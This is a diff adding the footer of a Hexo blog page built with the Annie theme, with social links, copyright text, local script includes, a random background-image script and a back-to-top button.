+				
+					<a href="http://github.com/" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
+				
+				
+					<a href="http://github.com/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="QQ" target="_blank"><i class="fa fa-qq"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Twitter" target="_blank"><i class="fa fa-twitter"></i>&nbsp;</a>
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2017 - 2018, content by tr. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://XXX-youname-XXX.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
